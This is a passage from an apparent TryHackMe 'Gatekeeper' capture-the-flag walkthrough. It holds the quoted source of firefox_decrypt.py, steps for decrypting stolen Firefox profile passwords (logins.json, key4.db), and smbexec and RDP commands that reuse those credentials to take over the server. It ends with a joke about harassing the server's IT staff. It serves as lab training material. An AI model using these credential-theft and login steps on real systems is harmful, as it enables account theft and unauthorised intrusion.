    textIOWrapper.flush()


def ask_section(sections: ConfigParser):
    """
    Prompt the user which profile should be used for decryption
    """
    # Do not ask for choice if user already gave one
    choice = "ASK"
    while choice not in sections:
        sys.stderr.write("Select the Mozilla profile you wish to decrypt\n")
        print_sections(sections)
        try:
            choice = input()
        except EOFError:
            LOG.error("Could not read Choice, got EOF")
            raise Exit(Exit.READ_GOT_EOF)

    try:
        final_choice = sections[choice]
    except KeyError:
        LOG.error("Profile No. %s does not exist!", choice)
        raise Exit(Exit.NO_SUCH_PROFILE)

    LOG.debug("Profile selection matched %s", final_choice)

    return final_choice


def ask_password(profile: str, interactive: bool) -> str:
    """
    Prompt for profile password
    """
    passwd: str
    passmsg = f"\nMaster Password for profile {profile}: "

    if sys.stdin.isatty() and interactive:
        passwd = getpass(passmsg)
    else:
        sys.stderr.write("Reading Master password from standard input:\n")
        sys.stderr.flush()
        # Ability to read the password from stdin (echo "pass" | ./firefox_...)
        passwd = sys.stdin.readline().rstrip("\n")

    return passwd


def read_profiles(basepath):
    """
    Parse Firefox profiles in provided location.
    If list_profiles is true, will exit after listing available profiles.
    """
    profileini = os.path.join(basepath, "profiles.ini")

    LOG.debug("Reading profiles from %s", profileini)

    if not os.path.isfile(profileini):
        LOG.warning("profile.ini not found in %s", basepath)
        raise Exit(Exit.MISSING_PROFILEINI)

    # Read profiles from Firefox profile folder
    profiles = ConfigParser()
    profiles.read(profileini, encoding=DEFAULT_ENCODING)

    LOG.debug("Read profiles %s", profiles.sections())

    return profiles


def get_profile(basepath: str, interactive: bool, choice: Optional[str], list_profiles: bool):
    """
    Select profile to use by either reading profiles.ini or assuming given
    path is already a profile
    If interactive is false, will not try to ask which profile to decrypt.
    choice contains the choice the user gave us as an CLI arg.
    If list_profiles is true will exits after listing all available profiles.
    """
    try:
        profiles: ConfigParser = read_profiles(basepath)

    except Exit as e:
        if e.exitcode == Exit.MISSING_PROFILEINI:
            LOG.warning("Continuing and assuming '%s' is a profile location", basepath)
            profile = basepath

            if list_profiles:
                LOG.error("Listing single profiles not permitted.")
                raise

            if not os.path.isdir(profile):
                LOG.error("Profile location '%s' is not a directory", profile)
                raise
        else:
            raise
    else:
        if list_profiles:
            LOG.debug("Listing available profiles...")
            print_sections(get_sections(profiles), sys.stdout)
            raise Exit(Exit.CLEAN)

        sections = get_sections(profiles)

        if len(sections) == 1:
            section = sections["1"]

        elif choice is not None:
            try:
                section = sections[choice]
            except KeyError:
                LOG.error("Profile No. %s does not exist!", choice)
                raise Exit(Exit.NO_SUCH_PROFILE)

        elif not interactive:
            LOG.error("Don't know which profile to decrypt. "
                      "We are in non-interactive mode and -c/--choice wasn't specified.")
            raise Exit(Exit.MISSING_CHOICE)

        else:
            # Ask user which profile to open
            section = ask_section(sections)

        section = section
        profile = os.path.join(basepath, section)

        if not os.path.isdir(profile):
            LOG.error("Profile location '%s' is not a directory. Has profiles.ini been tampered with?", profile)
            raise Exit(Exit.BAD_PROFILEINI)

    return profile


# From https://bugs.python.org/msg323681
class ConvertChoices(argparse.Action):
    """Argparse action that interprets the `choices` argument as a dict
    mapping the user-specified choices values to the resulting option
    values.
    """
    def __init__(self, *args, choices, **kwargs):
        super().__init__(*args, choices=choices.keys(), **kwargs)
        self.mapping = choices

    def __call__(self, parser, namespace, value, option_string=None):
        setattr(namespace, self.dest, self.mapping[value])


def parse_sys_args() -> argparse.Namespace:
    """Parse command line arguments
    """

    if SYSTEM == "Windows":
        profile_path = os.path.join(os.environ['APPDATA'], "Mozilla", "Firefox")
    elif os.uname()[0] == "Darwin":
        profile_path = "~/Library/Application Support/Firefox"
    else:
        profile_path = "~/.mozilla/firefox"

    parser = argparse.ArgumentParser(
        description="Access Firefox/Thunderbird profiles and decrypt existing passwords"
    )
    parser.add_argument(
        "profile",
        nargs="?", default=profile_path,
        help=f"Path to profile folder (default: {profile_path})")

    format_choices = {
        "human": HumanOutputFormat,
        "json": JSONOutputFormat,
        "csv": CSVOutputFormat,
        "tabular": TabularOutputFormat,
        "pass": PassOutputFormat,
    }

    parser.add_argument(
        "-f", "--format",
        action=ConvertChoices,
        choices=format_choices, default=HumanOutputFormat,
        help="Format for the output.")
    parser.add_argument(
        "-d", "--csv-delimiter",
        action="store",
        default=";",
        help="The delimiter for csv output")
    parser.add_argument(
        "-q", "--csv-quotechar",
        action="store",
        default='"',
        help="The quote char for csv output")
    parser.add_argument(
        "--no-csv-header",
        action="store_false", dest="csv_header",
        default=True,
        help="Do not include a header in CSV output.")
    parser.add_argument(
        "--pass-username-prefix",
        action="store",
        default="",
        help=(
            "Export username as is (default), or with the provided format prefix. "
            "For instance 'login: ' for browserpass."
        ))
    parser.add_argument(
        "-p", "--pass-prefix",
        action="store",
        default="web",
        help="Folder prefix for export to pass from passwordstore.org (default: %(default)s)")
    parser.add_argument(
        "-m", "--pass-cmd",
        action="store",
        default="pass",
        help="Command/path to use when exporting to pass (default: %(default)s)")
    parser.add_argument(
        "--pass-always-with-login",
        action="store_true",
        help="Always save as /<login> (default: only when multiple accounts per domain)")
    parser.add_argument(
        "-n", "--no-interactive",
        action="store_false", dest="interactive",
        default=True,
        help="Disable interactivity.")
    parser.add_argument(
        "-c", "--choice",
        help="The profile to use (starts with 1). If only one profile, defaults to that.")
    parser.add_argument(
        "-l", "--list",
        action="store_true",
        help="List profiles and exit.")
    parser.add_argument(
        "-e", "--encoding",
        action="store",
        default=DEFAULT_ENCODING,
        help="Override default encoding (%(default)s).")
    parser.add_argument(
        "-v", "--verbose",
        action="count",
        default=0,
        help="Verbosity level. Warning on -vv (highest level) user input will be printed on screen")
    parser.add_argument(
        "--version",
        action="version", version=__version__,
        help="Display version of firefox_decrypt and exit")

    args = parser.parse_args()

    # understand `\t` as tab character if specified as delimiter.
    if args.csv_delimiter == "\\t":
        args.csv_delimiter = "\t"

    return args


def setup_logging(args) -> None:
    """Setup the logging level and configure the basic logger
    """
    if args.verbose == 1:
        level = logging.INFO
    elif args.verbose >= 2:
        level = logging.DEBUG
    else:
        level = logging.WARN

    logging.basicConfig(
        format="%(asctime)s - %(levelname)s - %(message)s",
        level=level,
    )

    global LOG
    LOG = logging.getLogger(__name__)


def identify_system_locale() -> str:
    encoding: Optional[str] = locale.getpreferredencoding()

    if encoding is None:
        LOG.error(
            "Could not determine which encoding/locale to use for NSS interaction. "
            "This configuration is unsupported.\n"
            "If you are in Linux or MacOS, please search online "
            "how to configure a UTF-8 compatible locale and try again."
        )
        raise Exit(Exit.BAD_LOCALE)

    return encoding


def main() -> None:
    """Main entry point
    """
    args = parse_sys_args()

    setup_logging(args)

    global DEFAULT_ENCODING

    if args.encoding != DEFAULT_ENCODING:
        LOG.info("Overriding default encoding from '%s' to '%s'",
                 DEFAULT_ENCODING, args.encoding)

        # Override default encoding if specified by user
        DEFAULT_ENCODING = args.encoding

    LOG.info("Running firefox_decrypt version: %s", __version__)
    LOG.debug("Parsed commandline arguments: %s", args)
    encodings = (
        ("stdin", sys.stdin.encoding),
        ("stdout", sys.stdout.encoding),
        ("stderr", sys.stderr.encoding),
        ("locale", identify_system_locale()),
    )

    LOG.debug(
        "Running with encodings: %s: %s, %s: %s, %s: %s, %s: %s",
        *chain(*encodings)
    )

    for stream, encoding in encodings:
        if encoding.lower() != DEFAULT_ENCODING:
            LOG.warning("Running with unsupported encoding '%s': %s"
                        " - Things are likely to fail from here onwards", stream, encoding)

    # Load Mozilla profile and initialize NSS before asking the user for input
    moz = MozillaInteraction()

    basepath = os.path.expanduser(args.profile)

    # Read profiles from profiles.ini in profile folder
    profile = get_profile(basepath, args.interactive, args.choice, args.list)

    # Start NSS for selected profile
    moz.load_profile(profile)
    # Check if profile is password protected and prompt for a password
    moz.authenticate(args.interactive)
    # Decode all passwords
    outputs = moz.decrypt_passwords()

    # Export passwords into one of many formats
    formatter = args.format(outputs, args)
    formatter.output()

    # Finally shutdown NSS
    moz.unload_profile()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Quit.")
        sys.exit(Exit.KEYBOARD_INTERRUPT)
    except Exit as e:
        sys.exit(e.exitcode)
```
</details>

### Exploit
    
- I will copy or move the `logins.json`, `key4.db` & `cert9.db` to the same directory of `firefox_decrypt` tool

    - ![image](https://user-images.githubusercontent.com/94720207/169716137-effe0aee-3c1f-41ae-ab69-aa3dcd00fbb3.png)

- Execute `firefox_decrypt.py` 

    - ![image](https://user-images.githubusercontent.com/94720207/169716679-f5dfe627-e1c6-49c3-a561-bdc696b83f58.png)

- We can then use `smbexec` to connect to the Server via `smb` 

    - You can also try with `psexec` or `wmiexec` to log into the server with the credentials provided.
    
        - `/usr/share/doc/python3-impacket/examples/smbexec.py 'user*****:pass******@$ip_target'`

- ![image](https://user-images.githubusercontent.com/94720207/169717317-7a0f0d05-73a1-442d-b264-bbc2b6dbc198.png)

    - I can login using `RDP` too: 
    
        - `remmina -c rdp://user*****:pass*********@$ip_target`
    
        - ![image](https://user-images.githubusercontent.com/94720207/169718501-76fa0a34-c821-428b-b2c1-b2351efdda0e.png)
    
        - ![image](https://user-images.githubusercontent.com/94720207/169718663-994970bf-f380-48cf-8bc7-62d1884489ab.png)

    - **It's done :) We have root privileges and total control in the real `Gatekeeper Server`:** 
    
        1. **We have exploited this buffer overflow like a Sir.**
        2. **We Priv-Esc using Firefox Profile Data Exploit**
        3. **User+Root Flags Obtained**

- **Finally, you can pick the root flag, open and close the CD-tray of the Server over and over, and execute some notepads with creepy messages to scare the hell out of the poor IT guy working in that remote Site (It's his first day on that job).**   

---     










---

### References

- https://tryhackme.com/room/gatekeeper
- https://steflan-security.com/tryhackme-gatekeeper-walkthrough/
- https://github.com/hamza07-w/gatekeeper-tryHackme-writeup
- https://w33vils.medium.com/gatekeeper-walkthrough-try-hack-me-97603ad3758c
